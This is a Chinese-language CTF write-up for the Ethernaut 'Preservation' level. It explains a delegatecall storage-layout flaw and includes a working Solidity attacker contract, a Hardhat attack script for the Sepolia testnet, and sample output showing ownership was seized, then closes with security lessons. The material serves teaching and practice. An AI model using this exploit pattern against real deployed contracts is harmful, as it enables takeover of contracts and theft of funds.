# Preservation 攻略指南

本專案使用 Hardhat 開發環境，用於解決 [Ethernaut](https://ethernaut.openzeppelin.com/) 中的 Preservation 挑戰。

## 挑戰概述

Preservation 合約使用了委託調用（delegatecall）來實現時區庫的功能。這種委託調用機制允許外部庫合約修改呼叫合約的狀態。問題在於，合約實現中存在潛在的安全漏洞。

**目標**：獲取 Preservation 合約的所有權（成為 owner）。

## 漏洞分析

查看合約原始碼可以發現：

```solidity
contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

關鍵漏洞：使用 `delegatecall` 時，儲存槽位置的對應關係非常重要。當 Preservation 合約通過 delegatecall 調用庫合約的 `setTime` 函數時，雖然代碼在庫合約的上下文中執行，但是會修改 Preservation 合約的狀態。

問題在於 LibraryContract 和 Preservation 的儲存槽佈局不匹配：
- Preservation 合約中，第一個儲存槽是 `timeZone1Library` (address)
- LibraryContract 合約中，第一個儲存槽是 `storedTime` (uint256)

這意味著當 LibraryContract 的 `setTime` 函數修改 `storedTime` 時，實際上會修改 Preservation 的 `timeZone1Library` 變數。

## 攻擊步驟

1. 部署一個惡意庫合約，其儲存佈局與 Preservation 合約相匹配
2. 調用 `setFirstTime` 函數，傳入我們惡意庫合約地址（轉換為 uint256）
3. 再次調用 `setFirstTime`，這次會執行我們惡意庫合約的 `setTime` 函數
4. 在惡意 `setTime` 函數中，直接修改 `owner` 變數為攻擊者地址

## 專案結構

```
16-preservation/
├── contracts/
│   ├── Preservation.sol        # 原始挑戰合約
│   └── PreservationAttacker.sol # 攻擊合約
├── scripts/
│   └── deploy_PreservationAttacker.ts # 部署和攻擊腳本
├── hardhat.config.ts           # Hardhat 配置
└── README.md                   # 本文檔
```

## 合約實現

我們的攻擊合約如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    // 確保儲存佈局與 Preservation 一致
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    IPreservation public preservation;

    constructor(address _preservation) {
        preservation = IPreservation(_preservation);
    }

    function attack() public {
        // 第一步：將 timeZone1Library 改為我們的攻擊合約地址
        preservation.setFirstTime(uint256(uint160(address(this))));
        // 第二步：執行我們的 setTime 函數，改變所有者
        preservation.setFirstTime(1); // 參數不重要
    }

    function setTime(uint256 _timeStamp) public {
        owner = tx.origin; // 將合約所有者修改為我們的地址
    }
}

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
}
```

## 環境設置

### 前置條件

- Node.js 16+
- npm 或 yarn
- MetaMask 錢包
- 一些測試網 ETH (如 Sepolia)

### 安裝步驟

1. 複製專案
```bash
git clone https://github.com/your-username/ethernaut-solutions.git
cd ethernaut-solutions/16-preservation
```

2. 安裝依賴
```bash
npm install
# 或使用 yarn
yarn install
```

## 執行攻擊腳本

我們使用 Hardhat 腳本來解決挑戰：

```typescript
import hre from "hardhat";
const { ethers } = hre;

// 改為你的目標合約地址
const CONTRACT_ADDRESS = "YOUR_PRESERVATION_INSTANCE_ADDRESS";

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("我的帳戶地址 : ", signer.address);

    const preservation = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS);
    console.log("Preservation 關卡實例地址: ", CONTRACT_ADDRESS);
    console.log("目前的 Preservation owner: ", await preservation.owner());

    // =========進攻開始===========
    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
    const preservationAttacker = await PreservationAttacker.deploy(CONTRACT_ADDRESS);
    await preservationAttacker.waitForDeployment();
      
    console.log("PreservationAttacker Contract deployed to: ", await preservationAttacker.getAddress());
    console.log("目前的 PreservationAttacker owner: ", await preservationAttacker.owner());
    
    const tx = await preservationAttacker.attack();
    await tx.wait();

    console.log("目前的 Preservation owner: ", await preservation.owner());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

將 CONTRACT_ADDRESS 修改為 Ethernaut 平台上的實例地址，然後執行：

```bash
npx hardhat run scripts/deploy_PreservationAttacker.ts --network sepolia
```

執行結果示例：
```
我的帳戶地址 :  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
Preservation 關卡實例地址:  0x54058aA94F43E509Ad7B3D305aF9d612133f7907
目前的 Preservation owner:  0x35b28CB86846382Aa6217283F12C13657FF0110B
PreservationAttacker Contract deployed to:  0xC85d492a8Da94fdd05E2BdCA39B8b725fA1602D2
目前的 PreservationAttacker owner:  0x0000000000000000000000000000000000000000
目前的 Preservation owner:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
```

攻擊成功後，Preservation 合約的 owner 會變更為我們的地址，然後可以回到 Ethernaut 平台提交實例。

## 學習要點

1. **delegatecall 的危險性**：使用 delegatecall 時，被調用合約的代碼在呼叫合約的上下文中執行，可以修改呼叫合約的儲存。

2. **儲存槽位置一致性的重要性**：在使用 delegatecall 時，必須確保呼叫合約和被調用合約的儲存佈局一致，否則會導致意外的狀態變更。

3. **合約安全設計原則**：
   - 不要對不信任的外部合約使用 delegatecall
   - 使用庫合約時應確保其安全可靠
   - 實現庫合約時要考慮儲存佈局的一致性

4. **合約升級風險**：這個漏洞展示了合約升級機制（如代理模式）中可能存在的風險。

## 參考資料

- [Solidity 官方文檔 - Delegatecall / Callcode 和庫](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [Ethernaut - Preservation 挑戰](https://ethernaut.openzeppelin.com/level/16)
- [智能合約安全最佳實踐](https://consensys.github.io/smart-contract-best-practices/)
